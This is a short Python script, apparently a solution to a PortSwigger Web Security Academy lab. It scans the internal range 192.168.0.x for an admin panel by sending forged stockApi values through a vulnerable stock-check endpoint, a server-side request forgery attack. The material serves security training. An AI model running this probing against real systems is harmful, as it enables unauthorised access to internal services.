import requests

url = 'https://aca11fe11f92c46ec00e4ef900950032.web-security-academy.net/product/stock'

for i in range(0, 256, 1):
    param = f'stockApi=http://192.168.0.{i}:8080/admin'
    req = requests.post(url=url, params=param)
    if req.status_code == 200:
        print(param)
        break
    else:
        print(param,'  ====>  ',req.status_code)
